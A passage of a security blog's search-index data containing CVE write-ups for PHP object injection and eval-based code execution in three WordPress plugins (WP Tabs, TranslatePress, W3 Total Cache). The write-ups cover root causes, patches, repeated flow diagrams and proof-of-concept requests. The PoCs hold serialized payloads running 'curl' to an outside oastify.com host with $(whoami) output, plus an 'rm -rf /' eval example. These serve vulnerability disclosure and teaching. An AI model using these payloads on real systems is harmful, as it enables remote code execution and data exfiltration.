maybe_unserialize() to decode serialized data Call sanitize_and_collect_metabox_data() to sanitize and normalize data Finally, store the sanitized value using update_post_meta() for post ID $new_tabs_id Thus, the JSON structure to upload is: ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"] B --\u003e C{\"Check nonce: wp_verify_nonce()\"} C --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"] C --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"] D --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"] D --\u003e|Valid| E[\"Call import($shortcodes)\"] E --\u003e F[\"Loop through each shortcode\"] F --\u003e H{\"Has 'meta' and is array?\"} H --\u003e|No| Z[\"Skip entry\"] H --\u003e|Yes| I[\"Loop each meta field\"] I --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"} J --\u003e|No| Z J --\u003e|Yes| K[\"Replace {#ID#} with new ID\"] K --\u003e L[\"maybe_unserialize() ← Vulnerable\"] L --\u003e M{\"Does unserialize create object?\"} M --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"] M --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"] graph TD A[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"] B --\u003e C{\"Check nonce: wp_verify_nonce()\"} C --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"] C --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"] D --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"] D --\u003e|Valid| E[\"Call import($shortcodes)\"] E --\u003e F[\"Loop through each shortcode\"] F --\u003e H{\"Has 'meta' and is array?\"} H --\u003e|No| Z[\"Skip entry\"] H --\u003e|Yes| I[\"Loop each meta field\"] I --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"} J --\u003e|No| Z J --\u003e|Yes| K[\"Replace {#ID#} with new ID\"] K --\u003e L[\"maybe_unserialize() ← Vulnerable\"] L --\u003e M{\"Does unserialize create object?\"} M --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"] M --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"] graph TD A[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"] B --\u003e C{\"Check nonce: wp_verify_nonce()\"} C --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"] C --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"] D --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"] D --\u003e|Valid| E[\"Call import($shortcodes)\"] E --\u003e F[\"Loop through each shortcode\"] F --\u003e H{\"Has 'meta' and is array?\"} H --\u003e|No| Z[\"Skip entry\"] H --\u003e|Yes| I[\"Loop each meta field\"] I --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"} J --\u003e|No| Z J --\u003e|Yes| K[\"Replace {#ID#} with new ID\"] K --\u003e L[\"maybe_unserialize() ← Vulnerable\"] L --\u003e M{\"Does unserialize create object?\"} M --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"] M --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"] graph TD A[\"Administrator uploads JSON via /wp-admin/admin-ajax.php?action=tabs_import_shortcode\"] --\u003e B[\"import_shortcode() invoked\"] B --\u003e C{\"Check nonce: wp_verify_nonce()\"} C --\u003e|Fail| X[\"Stop \u0026 return error: Nonce verification failed\"] C --\u003e|Pass| D[\"json_decode() twice → extract $shortcodes\"] D --\u003e|Empty/Invalid| Y[\"Stop \u0026 return error: Nothing to import\"] D --\u003e|Valid| E[\"Call import($shortcodes)\"] E --\u003e F[\"Loop through each shortcode\"] F --\u003e H{\"Has 'meta' and is array?\"} H --\u003e|No| Z[\"Skip entry\"] H --\u003e|Yes| I[\"Loop each meta field\"] I --\u003e J{\"Key == 'sp_tab_source_options' OR 'sp_tab_shortcode_options'?\"} J --\u003e|No| Z J --\u003e|Yes| K[\"Replace {#ID#} with new ID\"] K --\u003e L[\"maybe_unserialize() ← Vulnerable\"] L --\u003e M{\"Does unserialize create object?\"} M --\u003e|Yes| R[\"Object Injection → Possible RCE if malicious class exists\"] M --\u003e|No| S[\"Sanitize + update_post_meta() and continue\"] ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Import JSON file: { \"shortcode\": { \"shortcode1\": { \"meta\": { \"sp_tab_source_options\": \"O:4:\\\"Evil\\\":1:{s:7:\\\"command\\\";s:75:\\\"curl http://m7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com/?leadked=$(whoami)\\\";}\" } } } } POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: administrator_cookie ... shortcode=%22%7B%5Cr%5Cn++%5C%22shortcode%5C%22%3A+%7B%5Cr%5Cn++++%5C%22shortcode1%5C%22%3A+%7B%5Cr%5Cn++++++%5C%22meta%5C%22%3A+%7B%5Cr%5Cn++++++++%5C%22sp_tab_source_options%5C%22%3A+%5C%22O%3A4%3A%5C%5C%5C%22Evil%5C%5C%5C%22%3A1%3A%7Bs%3A7%3A%5C%5C%5C%22command%5C%5C%5C%22%3Bs%3A75%3A%5C%5C%5C%22curl+http%3A%2F%2Fm7uzxda0q6dtl9sp5pvah7vuilocc30s.oastify.com%2F%3Fleadked%3D%24(whoami)%5C%5C%5C%22%3B%7D%5C%22%5Cr%5Cn++++++%7D%5Cr%5Cn++++%7D%5Cr%5Cn++%7D%5Cr%5Cn%7D%22\u0026action=tabs_import_shortcode\u0026nonce=b6d5e5977d\u0026unSanitize= Result ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-48134 originates from insecure deserialization through maybe_unserialize() during import, allowing PHP Object Injection and possible RCE if a malicious class exists. Even though Administrator privileges and a valid nonce are required, the impact is still critical. Version 2.2.13 fixes this by preventing arbitrary object creation during unserialization. ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Root cause: uncontrolled deserialization of input Impact: Object Injection and Remote Code Execution Administrator privileges required for exploitation Never unserialize user input without restricting classes or applying safe validation ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress WP Tabs Plugin \u003c= 2.2.12 is vulnerable to PHP Object Injection ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress TranslatePress Plugin.","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The vulnerability is a Deserialization of Untrusted Data issue in Cozmoslabs TranslatePress, which allows for Object Injection. This issue affects TranslatePress from n/a up to version 2.9.6. CVE ID: CVE-2025-30773 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.9.6 Patched Versions: 2.9.7 CVSS severity: High (7.2) Required Privilege: Administrator Product: WordPress TranslatePress Plugin ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – TranslatePress: 2.9.6 – vulnerable 2.9.7 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v2.9.6): class-upgrade.php v2.9.6 public function trp_update_database(){ if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){ $this-\u003estop_and_print_error( __('Update aborted! Your user account doesn\\'t have the capability to perform database updates.', 'translatepress-multilingual' ) ); } $nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false; if ( $nonce === false ){ $this-\u003estop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) ); } ... $extra_params = isset( $_REQUEST['trp_updb_extra_params'] ) ? unserialize(base64_decode(sanitize_text_field($_REQUEST['trp_updb_extra_params'] ))) : array(); ... } Here, unserialize() is called directly on user-supplied data ($_REQUEST['trp_updb_extra_params'] after HTML sanitization and Base64 decode). This creates a serious vulnerability: Object Injection risk: If an attacker provides a PHP object payload encoded in Base64, the decode + unserialize process can initialize a malicious object, leading to Object Injection and potentially Remote Code Execution (RCE). No safety validation: There is no data validation prior to calling unserialize(). No fallback mechanism: If data is invalid or malicious, the system lacks graceful handling, increasing risk. Patch (v2.9.7): Patch changes unserialize() is replaced with json_decode(): By removing unserialize(), the vulnerability surface is eliminated entirely. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The trp_update_database() function checks whether the current user is an Administrator via: if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){ $this-\u003estop_and_print_error( __('Update aborted! Your user account doesn\\'t have the capability to perform database updates.', 'translatepress-multilingual' ) ); } It also verifies a nonce to prevent CSRF: $nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false; if ( $nonce === false ){ $this-\u003estop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) ); } If nonce is missing, the vulnerability can be exploited unauthenticated by tricking an admin into visiting an attacker-controlled page. The browser will send the request with admin cookies, manage_options will pass, and backend logic proceeds. Searching for the trp_update_database function: Search result for trp_update_database trp_update_database is assigned to the page parameter, meaning it is the callback invoked when visiting /wp-admin/admin.php?page=trp_update_database. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"] B --\u003e C{\"Check capability: current_user_can(manage_options)\"} C --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"] C --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"] D --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"] D --\u003e|Pass| E[\"Read trp_updb_extra_params\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"unserialize()\"] G --\u003e H{\"Is payload malicious?\"} H --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"] H --\u003e|No| S[\"Continue update process normally\"] graph TD A[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"] B --\u003e C{\"Check capability: current_user_can(manage_options)\"} C --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"] C --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"] D --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"] D --\u003e|Pass| E[\"Read trp_updb_extra_params\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"unserialize()\"] G --\u003e H{\"Is payload malicious?\"} H --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"] H --\u003e|No| S[\"Continue update process normally\"] graph TD A[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"] B --\u003e C{\"Check capability: current_user_can(manage_options)\"} C --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"] C --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"] D --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"] D --\u003e|Pass| E[\"Read trp_updb_extra_params\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"unserialize()\"] G --\u003e H{\"Is payload malicious?\"} H --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"] H --\u003e|No| S[\"Continue update process normally\"] graph TD A[\"Administrator visits /wp-admin/admin.php?page=trp_update_database\"] --\u003e B[\"trp_update_database() invoked\"] B --\u003e C{\"Check capability: current_user_can(manage_options)\"} C --\u003e|Fail| X[\"Stop \u0026 print error: insufficient privilege\"] C --\u003e|Pass| D[\"Verify nonce: wp_verify_nonce()\"] D --\u003e|Fail| Y[\"Stop \u0026 print error: Invalid nonce\"] D --\u003e|Pass| E[\"Read trp_updb_extra_params\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"unserialize()\"] G --\u003e H{\"Is payload malicious?\"} H --\u003e|Yes| R[\"Object Injection → Code Execution (RCE)\"] H --\u003e|No| S[\"Continue update process normally\"] ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create test class in wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Send request through BurpSuite proxy Resend the request with trp_updb_extra_params containing a serialized Base64-encoded payload trp_updb_extra_params = base64_encode('O:4:\"Evil\":1:{s:7:\"command\";s:75:\"curl http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)\";}') POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: administrator_cookie ... action=trp_update_database\u0026trp_updb_nonce=808dff22f9\u0026initiate_update=true\u0026trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ== Output ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability originates from directly using unserialize() on user-controlled input without additional validation, enabling arbitrary object instantiation and potential remote code execution if a crafted payload is supplied. Combined with CSRF, an attacker could trick an admin into executing the payload silently. Switching to json_decode() in version 2.9.7 removes the attack surface entirely and properly resolves the issue. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways unserialize() on untrusted input always carries Object Injection and RCE risks. User input must be validated and sanitized before processing. CSRF can escalate an “authenticated exploit” into a “silent exploitation” scenario. json_decode() is a safer choice for structured data exchange. Comparing code differences between vulnerable and patched versions helps quickly identify root causes and solutions. ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress TranslatePress Plugin \u003c= 2.9.6 is vulnerable to PHP Object Injection ","date":"2025-11-23","objectID":"/posts/2025-11-23-cve-2025-30773/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-30773 Analysis \u0026 POC","uri":"/posts/2025-11-23-cve-2025-30773/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress W3 Total Cache Plugin.","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The WordPress W3 Total Cache plugin prior to version 2.8.13 has a command injection vulnerability via the _parse_dynamic_mfunc function, allowing unauthenticated users to execute PHP commands by submitting a comment with a malicious payload. CVE ID: CVE-2025-9501 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.8.12 Patched Versions: 2.8.13 CVSS severity: High (9) Required Privilege: Unauthenticated Product: WordPress W3 Total Cache Plugin ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - W3 Total Cache: 2.8.12 – vulnerable 2.8.13 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability originates from the _parse_dynamic_mfunc function: PgCache_ContentGrabber.php v2.8.12 public function _parse_dynamic_mfunc( $matches ) { $code1 = trim( $matches[1] ); $code2 = trim( $matches[2] ); $code = ( $code1 ? $code1 : $code2 ); if ( $code ) { $code = trim( $code, ';' ) . ';'; try { ob_start(); $result = eval( $code ); $output = ob_get_contents(); ob_end_clean(); } catch ( \\Exception $ex ) { $result = false; } if ( false === $result ) { $output = sprintf( 'Unable to execute code: %s', htmlspecialchars( $code ) ); } } else { $output = htmlspecialchars( 'Invalid mfunc tag syntax. The correct format is: \u003c!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --\u003e\u003c!-- /mfunc W3TC_DYNAMIC_SECURITY --\u003e or \u003c!-- W3TC_DYNAMIC_SECURITY mfunc --\u003ePHP code\u003c!-- /mfunc W3TC_DYNAMIC_SECURITY --\u003e.' ); } return $output; } The eval() function at line 11 is very dangerous as it executes a string as PHP code. Example: $command = 'system(\"rm -rf /\")'; eval($command); ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis When the plugin is installed and activated, it adds to the top of wp-config.php: \u003c?php /** Enable W3 Total Cache */ define('WP_CACHE', true); // Added by W3 Total Cache ... This registers caching for WordPress. WP_CACHE is used in wp-settings.php: wp-settings.php if ( WP_CACHE \u0026\u0026 apply_filters( 'enable_loading_advanced_cache_dropin', true ) \u0026\u0026 file_exists( WP_CONTENT_DIR . '/advanced-cache.php' ) ) { include WP_CONTENT_DIR . '/advanced-cache.php'; if ( $wp_filter ) { $wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter ); } } WordPress automatically loads advanced-cache.php if it exists. When activated, the plugin creates this file: advanced-cache.php \u003c?php defined( 'ABSPATH' ) || die(); global $w3tc_start_microtime; $w3tc_start_microtime = microtime( true ); if ( defined( 'WP_INSTALLING' ) \u0026\u0026 WP_INSTALLING ) return; if ( ! defined( 'W3TC_IN_MINIFY' ) ) { if ( ! defined( 'W3TC_DIR' ) ) { define( 'W3TC_DIR', ( defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : WP_CONTENT_DIR . '/plugins' ) . '/w3-total-cache' ); } if ( ! @is_dir( W3TC_DIR ) || ! file_exists( W3TC_DIR . '/w3-total-cache-api.php' ) ) { if ( defined( 'WP_ADMIN' ) ) { printf( '\u003cstrong\u003eW3 Total Cache Error:\u003c/strong\u003e some files appear to be missing or out of place. Please re-install plugin or remove \u003cstrong\u003e%s\u003c/strong\u003e. \u003cbr /\u003e', __FILE__ ); } } else { require_once W3TC_DIR . '/w3-total-cache-api.php'; if ( class_exists( '\\W3TC\\Dispatcher' ) ) { $w3tc_redirect = \\W3TC\\Dispatcher::component( 'Mobile_Redirect' ); $w3tc_redirect-\u003eprocess(); $w3tc_config = \\W3TC\\Dispatcher::config(); if ( $w3tc_config-\u003eget_boolean( 'pgcache.enabled' ) ) { $o = \\W3TC\\Dispatcher::component( 'PgCache_ContentGrabber' ); $o-\u003eprocess(); } } } } When page cache (pgcache) is enabled, $o-\u003eprocess() handles page cache logic. Enable page cache In process(), the plugin prepares a mechanism to intercept page content before sending it to the browser: PgCache_ContentGrabber.php v2.8.12 public function process() { $this-\u003erun_extensions_dropin(); ... Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) ); } This registers a callback: PgCache_ContentGrabber.php v2.8.12 Util_Bus::add_ob_callback( 'pagecache', array( $this, 'ob_callback' ) ); Meaning: Plugin registers a callback named pagecache. The callback is the ob_callback method of the current object. This is executed after WordPress generates the full HTML, allowing the plugin to process it (optimize, compress, cache) before sending it to the client. add_ob_callback() simply stores the callback: Util_Bus.php v2.8.12 public static function add_ob_callback( $key, $callback ) { $GLOBALS['_w3tc_ob_callbacks'][ $key ] = $callback; } ob_callback() is triggered when the output buffer is flushed, checking for dynamic content: PgCache_ContentGrabber.php v2.8.12 public function ob_callback( $buffer ) { ... $has_dynamic = $this-\u003e_has_dynamic( $buffer ); ... if ( $has_dynamic ) { $this-\u003e_shutdown_buffer = $buffer; $buffer = ''; register_shutdown_function(array($this, 'shutdown')); } return $buffer; } $buffer contains the full HTML WordPress generated. _has_dynamic() checks for non-cacheable sections: public function _has_dynamic( $buffer ) { if ( ! defined( 'W3TC_DYNAMIC_SECURITY' ) ) return false; return preg_match( '~\u003c!--\\s*m(func|clude)\\s*' . W3TC_DYNAMIC_SECURITY . '(.*)--\u003e(.*)\u003c!--\\s*/m(func|clude)\\s*' . W3TC_DYNAMIC_SECURITY . '\\s*--\u003e~Uis', $buffer ); } Dynamic content format: \u003c!-- mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e PHP code \u003c!-- /mfunc{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e or \u003c!-- mclude{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e PHP code \u003c!-- /mclude{W3TC_DYNAMIC_SECURITY_VALUE} --\u003e If no dynamic content → return buffer directly to cache. If dynamic content: Save full HTML to _shutdown_buffer Return empty string temporarily Register shutdown() to process after PHP request finishes PgCache_ContentGrabber.php v2.8.12 public function shutdown() { $compression = $this-\u003e_page_key_extension['compression']; $buffer = $this-\u003e_parse_dynamic( $this-\u003e","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"User requests any front‑end page (unauthenticated)\"] --\u003e B[\"WordPress loads wp-settings.php\"] B --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"] C --\u003e D[\"advanced-cache.php runs Dispatcher\"] D --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"] E --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"] F --\u003e G[\"WordPress renders full HTML into output buffer\"] G --\u003e H[\"ob_callback($buffer) triggered\"] H --\u003e I{\"_has_dynamic($buffer) ?\"} I --\u003e|No| J[\"Return buffer as-is → Serve cached page\"] I --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"] K --\u003e L[\"register_shutdown_function(shutdown)\"] L --\u003e M[\"After request completes → shutdown()\"] M --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"] N --\u003e O{\"HTML contains ?\"} O --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"] P --\u003e Q[\"Extract payload from comment and run eval()\"] O --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"] Q --\u003e S[\"Output replaced with execution result\"] R --\u003e S S --\u003e T[\"Page optionally compressed\"] T --\u003e U[\"echo back to user\"] graph TD A[\"User requests any front‑end page (unauthenticated)\"] --\u003e B[\"WordPress loads wp-settings.php\"] B --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"] C --\u003e D[\"advanced-cache.php runs Dispatcher\"] D --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"] E --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"] F --\u003e G[\"WordPress renders full HTML into output buffer\"] G --\u003e H[\"ob_callback($buffer) triggered\"] H --\u003e I{\"_has_dynamic($buffer) ?\"} I --\u003e|No| J[\"Return buffer as-is → Serve cached page\"] I --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"] K --\u003e L[\"register_shutdown_function(shutdown)\"] L --\u003e M[\"After request completes → shutdown()\"] M --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"] N --\u003e O{\"HTML contains ?\"} O --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"] P --\u003e Q[\"Extract payload from comment and run eval()\"] O --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"] Q --\u003e S[\"Output replaced with execution result\"] R --\u003e S S --\u003e T[\"Page optionally compressed\"] T --\u003e U[\"echo back to user\"] graph TD A[\"User requests any front‑end page (unauthenticated)\"] --\u003e B[\"WordPress loads wp-settings.php\"] B --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"] C --\u003e D[\"advanced-cache.php runs Dispatcher\"] D --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"] E --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"] F --\u003e G[\"WordPress renders full HTML into output buffer\"] G --\u003e H[\"ob_callback($buffer) triggered\"] H --\u003e I{\"_has_dynamic($buffer) ?\"} I --\u003e|No| J[\"Return buffer as-is → Serve cached page\"] I --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"] K --\u003e L[\"register_shutdown_function(shutdown)\"] L --\u003e M[\"After request completes → shutdown()\"] M --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"] N --\u003e O{\"HTML contains ?\"} O --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"] P --\u003e Q[\"Extract payload from comment and run eval()\"] O --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"] Q --\u003e S[\"Output replaced with execution result\"] R --\u003e S S --\u003e T[\"Page optionally compressed\"] T --\u003e U[\"echo back to user\"] graph TD A[\"User requests any front‑end page (unauthenticated)\"] --\u003e B[\"WordPress loads wp-settings.php\"] B --\u003e C[\"WP_CACHE = true → Load advanced-cache.php\"] C --\u003e D[\"advanced-cache.php runs Dispatcher\"] D --\u003e E[\"PgCache_ContentGrabber-\u003eprocess()\"] E --\u003e F[\"Util_Bus::add_ob_callback('pagecache', 'ob_callback')\"] F --\u003e G[\"WordPress renders full HTML into output buffer\"] G --\u003e H[\"ob_callback($buffer) triggered\"] H --\u003e I{\"_has_dynamic($buffer) ?\"} I --\u003e|No| J[\"Return buffer as-is → Serve cached page\"] I --\u003e|Yes| K[\"Save buffer to _shutdown_buffer\"] K --\u003e L[\"register_shutdown_function(shutdown)\"] L --\u003e M[\"After request completes → shutdown()\"] M --\u003e N[\"_parse_dynamic(_shutdown_buffer)\"] N --\u003e O{\"HTML contains ?\"} O --\u003e|Yes| P[\"_parse_dynamic_mfunc()\"] P --\u003e Q[\"Extract payload from comment and run eval()\"] O --\u003e|Or mclude| R[\"_parse_dynamic_mclude() (include type)\"] Q --\u003e S[\"Output 